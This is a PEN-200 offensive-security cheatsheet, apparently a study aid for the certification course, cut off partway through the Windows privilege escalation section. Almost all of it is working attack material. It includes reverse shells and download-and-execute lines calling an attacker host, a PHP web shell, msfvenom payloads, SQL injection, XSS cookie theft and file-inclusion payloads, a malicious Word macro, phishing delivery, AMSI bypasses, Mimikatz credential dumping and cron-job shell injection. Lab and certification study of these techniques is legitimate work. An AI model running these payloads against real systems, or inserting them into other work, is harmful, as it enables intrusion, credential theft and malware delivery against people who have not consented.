# PEN-200 Offensive Security Cheatsheet
> **Usage:** Replace `<IP>`, `<USER>`, `<PASS>`, `<LHOST>`, `<LPORT>` with your values. Commands marked `[win]` run on Windows targets/sessions; `[lin]` on Linux.

---

## Table of Contents
1. [Quick-Reference Shells & Listeners](#1-quick-reference-shells--listeners)
2. [Reconnaissance & OSINT](#2-reconnaissance--osint)
3. [Network & Service Enumeration](#3-network--service-enumeration)
4. [Vulnerability Scanning](#4-vulnerability-scanning)
5. [Web Application Attacks](#5-web-application-attacks)
6. [Password Attacks](#6-password-attacks)
7. [Public Exploits](#7-public-exploits)
8. [Client-Side Attacks](#8-client-side-attacks)
9. [Antivirus Evasion](#9-antivirus-evasion)
10. [Linux Privilege Escalation](#10-linux-privilege-escalation)
11. [Windows Privilege Escalation](#11-windows-privilege-escalation)
12. [Port Forwarding & Tunneling](#12-port-forwarding--tunneling)
13. [Active Directory Enumeration](#13-active-directory-enumeration)
14. [Active Directory Authentication Attacks](#14-active-directory-authentication-attacks)
15. [Active Directory Lateral Movement](#15-active-directory-lateral-movement)
16. [Active Directory Persistence](#16-active-directory-persistence)
17. [ADCS — Active Directory Certificate Services](#17-adcs--active-directory-certificate-services)
18. [AD Delegation Attacks](#18-ad-delegation-attacks)
19. [IPv6 & Coercion Attacks](#19-ipv6--coercion-attacks)
20. [MSSQL Attacks](#20-mssql-attacks)
21. [Modern Web Attacks](#21-modern-web-attacks)
22. [AWS Cloud Attacks](#22-aws-cloud-attacks)
23. [Azure / Entra ID Attacks](#23-azure--entra-id-attacks)
24. [Metasploit Framework](#24-metasploit-framework)
25. [General Utilities & Modern Tooling](#25-general-utilities--modern-tooling)

---

## 1. Quick-Reference Shells & Listeners

> **Concept:** A reverse shell connects *back* to your listener. A bind shell *listens* on the victim. Always prefer reverse shells through restrictive firewalls. Use `rlwrap nc -nlvp <port>` for arrow-key history support.

### Listeners
```bash
nc -nlvp <LPORT>
rlwrap nc -nlvp <LPORT>                      # with readline support
sudo nc -nlvp 443                            # use privileged port to bypass egress filters
```

### Bash / sh Reverse Shells
```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'   # wrap in another bash for redirects
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f
```

### Python Reverse Shell
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PowerShell Reverse Shell
```powershell
# One-liner
powershell -nop -w hidden -c "$client=New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64-encode for safe delivery (run in pwsh/PowerShell)
$Text = '<payload_here>'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$Encoded = [Convert]::ToBase64String($Bytes)
powershell -nop -w hidden -enc $Encoded
```

### Powercat Reverse Shell
```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1')
powercat -c <LHOST> -p <LPORT> -e powershell
```

### Web Shells
```php
<?php system($_GET['cmd']); ?>                           # minimal
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

### Upgrade Shell to TTY (Linux)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z  → stty raw -echo; fg  → reset
export TERM=xterm; stty rows 40 cols 150
```

### Msfvenom Payload Generation
```bash
# Windows staged Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe

# Windows non-staged
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o nonstaged.exe

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf

# PowerShell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh-reflection -o shell.ps1

# HTA (for macro/browser delivery)
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hta-psh -o shell.hta

# Python meterpreter (for dependency chain abuse)
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT>

# List payloads
msfvenom -l payloads --platform windows --arch x64
```

---

## 2. Reconnaissance & OSINT

> **Concept:** OSINT is passive intel gathering — no direct interaction with the target. Use WHOIS, DNS, Google dorks, certificate transparency logs, and metadata from public files.

### WHOIS
```bash
whois <domain>
whois <IP>
```

### Google Dorks
```
site:target.com filetype:pdf
site:target.com filetype:xlsx OR filetype:docx
site:target.com inurl:admin
site:target.com intitle:"index of"
"@target.com" filetype:pdf
```
> Resources: [GHDB](https://www.exploit-db.com/google-hacking-database) · [DorkSearch](https://dorksearch.com/)

### theHarvester
```bash
theHarvester -d target.com -b google,bing,linkedin,shodan -l 500
```

### Document Metadata
```bash
exiftool -a -u <file.pdf>
exiftool -a -u *.pdf | grep -i "author\|creator\|producer"
```

### Certificate Transparency
```
https://crt.sh/?q=%.target.com
https://transparencyreport.google.com/https/certificates
```

### Tech Stack / Headers
```
https://www.wappalyzer.com
https://securityheaders.com/
https://www.ssllabs.com/ssltest/
```

---

## 3. Network & Service Enumeration

> **Concept:** Start broad (host discovery → port scan → service/version detection → OS fingerprint → script scanning). Always run UDP in parallel with TCP — common UDP services include DNS (53), SNMP (161), NTP (123), TFTP (69).

### Nmap

```bash
# Host discovery sweep
sudo nmap -sn <network>/24

# Quick TCP scan (top 1000 ports)
nmap -sC -sV -v <IP>

# Full TCP scan
sudo nmap -T4 -A -p- <IP> -v

# Stealth SYN scan
sudo nmap -sS -p- <IP>

# UDP (slow — limit scope)
sudo nmap -sU -F -sV <IP>

# OS fingerprint
sudo nmap -O --osscan-guess <IP>

# Vuln scripts
sudo nmap -sV -p 443 --script "vuln" <IP>

# SMB scripts
nmap -v -p 139,445 -oG smb.txt <network>/24

# HTTP enum
sudo nmap -p80 --script=http-enum <IP>

# Grep results
grep -B 2 "445/tcp open" finds.txt

# Disable ping (treat as up)
nmap -Pn -sC -sV <IP>

# Output to file
nmap -sC -sV <IP> -oN scan.txt
nmap -sC -sV <IP> -oG scan-grep.txt
```

### Windows Port Testing `[win]`
```powershell
Test-NetConnection -Port 445 <IP>
1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("<IP>", $_)) "TCP port $_ is open" } 2>$null
```

### DNS Enumeration
```bash
host -t mx target.com
host -t ns target.com
host -t txt target.com

# Zone transfer attempt
host -l target.com <nameserver>
dnsrecon -d target.com -t axfr

# Standard enum
dnsrecon -d target.com -t std
dnsenum target.com

# Bruteforce subdomains
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
dnsrecon -d target.com -D wordlist.txt -t brt

# Windows
nslookup -type=TXT target.com
nslookup -type=MX target.com
```

### SMB Enumeration
```bash
# Enum shares (anonymous)
smbclient -L //<IP> -N
smbclient //<IP>/<share> -N

# NetExec (replaces CrackMapExec)
netexec smb <IP>
netexec smb <IP> -u '' -p '' --shares         # null session
netexec smb <IP> -u <USER> -p <PASS> --shares
netexec smb <IP> -u <USER> -p <PASS> --sam    # dump SAM
netexec smb <network>/24 -u <USER> -p <PASS>  # spray network

# enum4linux-ng (replaces enum4linux)
enum4linux-ng -A <IP>

# Nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users -p 139,445 <IP>
nmap --script smb-vuln-ms17-010 -p 445 <IP>

# nbtscan
sudo nbtscan -r <network>/24

# Mount share
sudo mount -t cifs //<IP>/<share> /mnt/smb -o username=<USER>,password=<PASS>
```

### SMTP Enumeration
```bash
nc -nv <IP> 25
VRFY root
EXPN postmaster
swaks --from attacker@evil.com --to <USER>@target.com --server <IP>
```

### SNMP Enumeration
```bash
sudo nmap -sU --open -p 161 <network>/24 -oG snmp-hosts.txt
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
snmpwalk -c public -v1 -t 10 <IP>
snmpwalk -c public -v2c <IP> 1.3.6.1.2.1.25.4.2.1.2   # running processes
snmpwalk -c public -v2c <IP> 1.3.6.1.2.1.25.6.3.1.2   # installed software
snmpwalk -c public -v2c <IP> 1.3.6.1.2.1.4.21.1.1     # routing table
```

### Directory/File Scanning
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 -x php,html,txt,js,json,bak,zip -o gobuster.txt

# Feroxbuster (recursive, faster)
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt -t 50 --auto-tune

# API pattern
gobuster dir -u http://<IP>:5000 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
# pattern.txt content:  {GOBUSTER}/v1  {GOBUSTER}/v2

# WordPress
wpscan --url http://<IP>/ --enumerate vp,u,vt,tt --verbose
wpscan --url http://<IP>/ --enumerate u --passwords /usr/share/wordlists/rockyou.txt
```

---

## 4. Vulnerability Scanning

> **Concept:** Unauthenticated scans find remotely exploitable vulnerabilities. Authenticated scans reveal local misconfigurations and missing patches. Never run aggressive scans without scope confirmation.

### Nessus
```bash
sudo systemctl start nessusd.service
# Access: https://127.0.0.1:8834
# Templates: Basic Network Scan → Recommended starting point
# Enable UDP scanning manually; disable host discovery if hosts are known up
```

### Nikto
```bash
nikto -h http://<IP> -p <PORT>
nikto -h http://<IP> -p 443 -ssl
```

### Nuclei
```bash
nuclei -u http://<IP>
nuclei -u http://<IP> -t /usr/share/nuclei-templates/cves/
nuclei -l targets.txt -t /usr/share/nuclei-templates/ -severity critical,high
```

### Nmap Vuln Scripts
```bash
sudo nmap -sV --script vuln <IP>
sudo nmap -sV -p 445 --script smb-vuln-* <IP>
# Update script DB after adding custom scripts:
sudo nmap --script-updatedb
```

### SearchSploit
```bash
searchsploit <service> <version>
searchsploit -m <exploit_id>          # copy exploit locally
searchsploit --update
```

---

## 5. Web Application Attacks

> **Concept:** Web app testing follows: enumerate stack → spider/directory-brute → analyze HTTP headers/cookies → test each input (SQLi, XSS, LFI, upload, command injection). Use Burp Suite as the central interception proxy.

### Burp Suite Quick Setup
1. Firefox → Settings → Network → Manual proxy: `127.0.0.1:8080`
2. Disable captive portal: `about:config` → `network.captive-portal-service.enabled` = false
3. Import Burp CA cert for HTTPS interception

### curl Cheatsheet
```bash
curl -v http://<IP>/                                   # verbose
curl -X POST -d "user=admin&pass=test" http://<IP>/login
curl -H "Content-Type: application/json" -d '{"user":"admin"}' http://<IP>/api
curl --proxy 127.0.0.1:8080 http://<IP>/              # route through Burp
curl -b "session=abc123" http://<IP>/admin
curl -k https://<IP>/                                  # ignore SSL errors
```

### Common Files to Check
```
/robots.txt
/sitemap.xml
/.git/config
/.env
/wp-json/wp/v2/users
/phpinfo.php
/admin
```

### SQL Injection

> **Concept:** Test every parameter for SQLi. Error-based → extract via error messages. UNION-based → append rows to result set. Blind Boolean → infer via true/false responses. Blind Time-based → infer via sleep delays. Always determine number of columns with `ORDER BY` first.

```bash
# Basic auth bypass
' OR '1'='1' -- -
' OR 1=1 -- //
admin'-- -

# Identify column count
' ORDER BY 1-- //        # increment until error

# UNION-based (n columns)
' UNION SELECT null,null,null-- //
' UNION SELECT null,user(),@@version-- //
' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema=database()-- //
' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'-- //

# Error-based version
' OR 1=1 IN (SELECT @@version)-- //

# Blind Boolean
' AND 1=1-- //    # true
' AND 1=2-- //    # false

# Blind Time-based
' AND IF(1=1,SLEEP(3),0)-- //          # MySQL
'; WAITFOR DELAY '0:0:5'--             # MSSQL

# MSSQL: enable xp_cmdshell
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# MySQL: write webshell
' UNION SELECT "<?php system($_GET['cmd']);?>",null INTO OUTFILE "/var/www/html/shell.php"-- //

# SQLMap
sqlmap -u "http://<IP>/page.php?id=1" -p id --dbs
sqlmap -u "http://<IP>/page.php?id=1" -p id -D <db> --tables
sqlmap -u "http://<IP>/page.php?id=1" -p id -D <db> -T <table> --dump
sqlmap -r burp_request.txt -p <param> --os-shell --web-root "/var/www/html/tmp"
```

### XSS
```javascript
// Basic test
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

// Cookie steal
<script>new Image().src="http://<LHOST>/steal?c="+document.cookie;</script>

// Redirect
<script>window.location="http://<LHOST>/?c="+document.cookie</script>
```

### Local File Inclusion (LFI)
```bash
# Basic traversal
http://<IP>/page.php?file=../../../../etc/passwd
http://<IP>/page.php?file=....//....//etc/passwd       # filter bypass

# Common files
/etc/passwd
/etc/shadow
/etc/hosts
/var/log/apache2/access.log                            # log poisoning
C:\Windows\System32\drivers\etc\hosts
C:\xampp\passwords.txt

# PHP wrappers
http://<IP>/page.php?file=php://filter/resource=<file>
http://<IP>/page.php?file=php://filter/convert.base64-encode/resource=config.php

# Data wrapper (allow_url_include must be on)
http://<IP>/page.php?file=data://text/plain,<?php%20system('id');?>
http://<IP>/page.php?file=data://text/plain;base64,<base64_payload>

# Log poisoning → RCE
# 1. Inject PHP into User-Agent header:
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://<IP>/
# 2. Include the log:
http://<IP>/page.php?file=/var/log/apache2/access.log&cmd=id
```

### Remote File Inclusion (RFI)
```bash
python3 -m http.server 80          # host backdoor on Kali
http://<IP>/page.php?file=http://<LHOST>/shell.php
http://<IP>/page.php?file=http://<LHOST>/php-reverse-shell.php
```

### File Upload Bypasses
```bash
# Change extension
shell.php → shell.pHP / shell.php5 / shell.php7 / shell.phtml / shell.phps

# Change MIME type in Burp: Content-Type: image/jpeg

# Double extension
shell.jpg.php

# Null byte (older PHP)
shell.php%00.jpg

# Magic bytes — prepend to PHP file: GIF89a;

# Overwrite SSH keys via directory traversal in filename param:
../../../root/.ssh/authorized_keys
```

### OS Command Injection
```bash
# Test payloads
; id
| id
`id`
$(id)
& whoami &             # Windows
; ping -c 1 <LHOST>;   # Blind — listen with tcpdump

# Determine shell type
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

# Powercat reverse shell via command injection
IEX (New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e powershell
```

---

## 6. Password Attacks

> **Concept:** Order of preference: (1) find cleartext creds in config/history files, (2) dump hashes and crack offline, (3) spray known passwords, (4) brute-force targeted accounts. Account lockout policies make brute-force risky — always confirm threshold first.

### Online Attacks (Hydra)
```bash
# SSH
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<IP>

# RDP spray
hydra -L users.txt -p "Password1" rdp://<IP>

# HTTP POST form
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv http-get://<IP>/

# FTP / Telnet / SMB
hydra -l <USER> -P rockyou.txt ftp://<IP>
hydra -l <USER> -P rockyou.txt smb://<IP>
```

### Password Spraying (NetExec)
```bash
netexec smb <IP>/24 -u users.txt -p "Password1" --continue-on-success
netexec smb <IP> -u <USER> -p <PASS>
netexec winrm <IP> -u <USER> -p <PASS>
netexec ssh <IP>/24 -u <USER> -p <PASS>
netexec ldap <IP> -u <USER> -p <PASS> --password-not-required    # ASREPRoast candidates
```

### Hash Cracking (Hashcat)
```bash
# Identify hash type
hash-identifier <hash>
hashid <hash>

# Common modes
hashcat -m 0    # MD5
hashcat -m 100  # SHA1
hashcat -m 1000 # NTLM
hashcat -m 5600 # Net-NTLMv2
hashcat -m 13100 # Kerberoast (TGS-REP)
hashcat -m 18200 # AS-REP Roast
hashcat -m 13400 # KeePass
hashcat -m 22921 # SSH private key

# Dictionary attack
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Rule-based
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Brute-force mask
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?d?d?d?d    # Passw0rd pattern

# Mutation rules in file
$1 c     # append 1, capitalize (same rule line = consecutive)
$1\nc    # append 1 OR capitalize (different lines = separate)
hashcat -r custom.rule --stdout wordlist.txt   # preview mutations
```

### John the Ripper
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>
john --rules --wordlist=rockyou.txt <hashfile>

# SSH key
ssh2john id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash

# KeePass
keepass2john Database.kdbx > keepass.hash
john keepass.hash --wordlist=rockyou.txt

# Zip/RAR
zip2john archive.zip > zip.hash
rar2john archive.rar > rar.hash
```

### Mimikatz — Hash Extraction `[win]`
```
privilege::debug
token::elevate
sekurlsa::logonpasswords         # dump all cached creds + hashes
lsadump::sam                     # dump SAM hashes
lsadump::dcsync /user:Administrator   # DCSync (DA required)
sekurlsa::tickets                # list Kerberos tickets in memory
crypto::capi                     # patch CryptoAPI (export non-exportable certs)
misc::memssp                     # inject SSP to log plaintext creds → C:\Windows\System32\mimilsa.log
```

### Pass-the-Hash
```bash
# Impacket
impacket-psexec -hashes 00000000000000000000000000000000:<NTHASH> <USER>@<IP>
impacket-wmiexec -hashes 00000000000000000000000000000000:<NTHASH> <USER>@<IP>
impacket-smbexec -hashes 00000000000000000000000000000000:<NTHASH> <USER>@<IP>

# NetExec
netexec smb <IP> -u <USER> -H <NTHASH>
netexec smb <IP> -u <USER> -H <NTHASH> --exec-method smbexec -x whoami

# SMBclient
smbclient //<IP>/share -U <USER> --pw-nt-hash <NTHASH>
```

### Net-NTLMv2 Capture & Relay
```bash
# Capture with Responder
sudo responder -I eth0 -v
# Then crack: hashcat -m 5600 captured.hash rockyou.txt

# Relay (target must have UAC remote restrictions disabled)
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -enc <b64>"

# Force authentication from victim (if RCE exists on victim)
# Point victim to: \\<LHOST>\share   (triggers SMB auth to Responder)
```

### KeePass
```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

---

## 7. Public Exploits

### SearchSploit
```bash
searchsploit <service> <version>
searchsploit -m <id>            # copy to current dir
searchsploit -x <id>            # examine in-place
searchsploit --update
```

### Online Resources
- Exploit-DB: https://www.exploit-db.com
- Packet Storm: https://packetstormsecurity.com
- GitHub PoCs: `site:github.com <CVE-XXXX-XXXXX>`
- NVD: https://nvd.nist.gov

### Finding & Preparing Exploits
```bash
# Identify version
nmap -sV -p <PORT> <IP>

# Search MSF
msf> search type:exploit name:<service>
msf> search cve:2021-41773

# Compile C exploit
gcc exploit.c -o exploit
# Cross-compile for Windows
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe

# Transfer to target
python3 -m http.server 8080
# On victim (Linux):
wget http://<LHOST>:8080/exploit
# On victim (Windows):
certutil -urlcache -split -f http://<LHOST>:8080/exploit.exe exploit.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<LHOST>/file','C:\path\file')"
curl.exe -o C:\Temp\file.exe http://<LHOST>/file.exe
```

---

## 8. Client-Side Attacks

> **Concept:** Client-side attacks deliver malicious payloads to user machines rather than exploiting server services. Common vectors: Office macros, Windows Library files (.Library-ms), HTA files, LNK shortcuts. Always gather OS/software info (Canarytokens, metadata) before crafting payloads.

### Information Gathering
```bash
exiftool -a -u document.pdf       # metadata → author, software, OS
# Canarytokens: https://canarytokens.org → embed in email/doc to fingerprint target
```

### Office VBA Macro (Word)
1. Save as `.doc` or `.docm` (NOT `.docx`)
2. View → Macros → Create in document
3. Use `AutoOpen()` and `Document_Open()` event hooks

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc "
    Str = Str + "<BASE64_PAYLOAD_SPLIT_ACROSS_LINES>"   ' 255 char limit per literal
    CreateObject("Wscript.Shell").Run Str
End Sub
```

```bash
# Generate base64 PS reverse shell payload
python3 -c "
import base64
payload = '\$c=New-Object Net.Sockets.TCPClient(\"<LHOST>\",<LPORT>);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+\"PS \"+(pwd).Path+\"> \";\$sb3=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sb3,0,\$sb3.Length);\$s.Flush()};\$c.Close()'
print(base64.b64encode(payload.encode('utf-16-le')).decode())
"
```

### WebDAV + Library File Attack
```bash
# 1. Install and start WebDAV
pip3 install wsgidav
mkdir /home/kali/webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/

# 2. Create .lnk shortcut in webdav dir (via PowerShell on Windows or script)
# Target: powershell.exe  
# Arguments: -c "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e powershell"

# 3. Create config.Library-ms pointing to your WebDAV
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://<LHOST></url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

```bash
# 4. Deliver via email with swaks
swaks --from attacker@evil.com --to victim@target.com \
  --server <SMTP_IP> --auth LOGIN --auth-user attacker@evil.com \
  --auth-password 'pass' --attach @/home/kali/config.Library-ms
```

---

## 9. Antivirus Evasion

> **Concept:** Modern AV uses signature, heuristic, behavior, and ML detection. Evasion strategies: (1) Obfuscate on-disk payloads, (2) Inject shellcode into memory to avoid disk writes, (3) Use legitimate binaries as carriers (LOLBins), (4) Encrypt payloads, (5) Fragment delivery.

### Shellter (PE Injection)
```bash
sudo apt install shellter wine
sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32
shellter   # Interactive: Auto mode → PE path → Meterpreter payload options
```

### Veil
```bash
/usr/share/veil/Veil.py
# Choose Evasion → select payload (e.g. python/meterpreter/rev_tcp) → generate
```

### Manual AMSI Bypass (PowerShell) `[win]`
```powershell
# AMSI patch (run before loading tools)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Or use obfuscated version to avoid signature detection:
$a=[Ref].Assembly.GetType('System.Management.Automation.'+'AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

### PowerShell Execution Policy Bypass `[win]`
```powershell
powershell -ep bypass
powershell -ExecutionPolicy Unrestricted
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
Import-Module .\script.ps1   # after ep bypass
```

### In-Memory Shellcode Injection (Manual PS) `[win]`
```powershell
$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr a, uint b, uint c);
"@
# Then inject shellcode bytes into allocated memory and create thread
```

### LOLBins for Payload Delivery `[win]`
```powershell
# certutil download
certutil -urlcache -split -f http://<LHOST>/shell.exe shell.exe
# mshta (HTA execution)
mshta http://<LHOST>/shell.hta
# regsvr32
regsvr32 /s /n /u /i:http://<LHOST>/shell.sct scrobj.dll
# rundll32
rundll32 shell32.dll,Control_RunDLL http://<LHOST>/payload.dll
```

---

## 10. Linux Privilege Escalation

> **Concept:** Check in order: (1) sudo -l for free privesc, (2) SUID/GUID binaries, (3) writable cron jobs, (4) sensitive files (passwords in configs/history), (5) capabilities, (6) writable /etc/passwd, (7) kernel exploits. GTFOBins is your friend: https://gtfobins.github.io

### Situational Awareness
```bash
id; whoami; hostname
cat /etc/issue; cat /etc/*-release; uname -a
sudo -l
ps aux
ss -anp
ip a; ip route
env
echo $PATH
```

### Automated Tools
```bash
./unix-privesc-check standard > output.txt
# LinPEAS — most comprehensive
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a > linpeas.txt 2>&1

# LinEnum
./LinEnum.sh -t

# LES (Linux Exploit Suggester)
./les.sh
```

### Sensitive File Hunting
```bash
grep -ri "password" /home /etc /var /opt 2>/dev/null
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "id_rsa" -o -name "id_ecdsa" -o -name ".ssh" 2>/dev/null
cat ~/.bash_history; cat ~/.zsh_history
cat ~/.bashrc; cat ~/.profile; env
find / -writable -type f 2>/dev/null | grep -v proc
find / -user root -writable -not -path "*/proc/*" -not -path "*/sys/*" 2>/dev/nul
```

### SUID / GUID Abuse
```bash
find / -perm -u=s -type f 2>/dev/null    # SUID
find / -perm -g=s -type f 2>/dev/null    # GUID

# GTFOBins quick hits (if binary is SUID)
find / -exec /bin/sh -p \; -quit
bash -p
vim -c ':!/bin/sh'
awk 'BEGIN {system("/bin/sh")}'
perl -e 'exec "/bin/sh";'
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
env /bin/sh -p
```

### Capabilities
```bash
/usr/sbin/getcap -r / 2>/dev/null
# Look for: cap_setuid+ep, cap_net_raw+ep, cap_dac_read_search+ep
# e.g. python3 with cap_setuid: python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

### Sudo Abuse
```bash
sudo -l
# No password / ALL: sudo su, sudo /bin/bash
# Specific binary → check GTFOBins
sudo vim -c ':!/bin/bash'
sudo find / -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo env /bin/bash
```

### Cron Job Exploitation
```bash
cat /etc/crontab
ls -la /etc/cron.*
grep "CRON" /var/log/syslog | tail -20
# Find writable scripts run by cron:
find /etc/cron* /var/spool/cron -writable 2>/dev/null

# Inject reverse shell into writable cron script:
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f" >> /path/to/cronjob.sh
```

### /etc/passwd Write Access
```bash
openssl passwd -1 hacked123            # generate MD5 hash
echo 'r00t:$1$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su - r00t
```

### Kernel Exploits
```bash
uname -a
searchsploit "linux kernel $(uname -r)" local privilege escalation
# Transfer and compile locally on victim
gcc exploit.c -o exploit && ./exploit
```

### Service Footprint
```bash
ps aux | grep -v "grep"
watch -n 1 "ps aux | grep pass"
sudo tcpdump -i lo -A | grep -i "pass\|user\|login"
```

---

## 11. Windows Privilege Escalation

> **Concept:** Check in order: (1) whoami /priv — SeImpersonatePrivilege is almost always exploitable, (2) unquoted service paths, (3) writable service binaries, (4) AlwaysInstallElevated, (5) stored credentials/history, (6) scheduled tasks with writable actions, (7) DLL hijacking, (8) UAC bypass.

### Situational Awareness `[win]`
```powershell
whoami; whoami /groups; whoami /priv
hostname; systeminfo
net user; net localgroup administrators
Get-LocalUser; Get-LocalGroup
ipconfig /all; route print; netstat -ano

# Installed software
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName,DisplayVersion
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName

# Running processes
Get-Process | Select Name,Id,Path

# Environment
Get-ChildItem Env:
echo %APPDATA%; echo %TEMP%
```

### Automated Tools `[win]`
```powershell
# WinPEAS
.\winPEAS.exe
.\winPEAS.bat

# PowerUp (PowerSploit)
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# PrivescCheck
Invoke-PrivescCheck -Extended -Report PrivescCheck
```

### Sensitive File Search `[win]`
```powershell
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config,*.xml,*.log -File -Recurse -ErrorAction SilentlyContinue | Select FullName
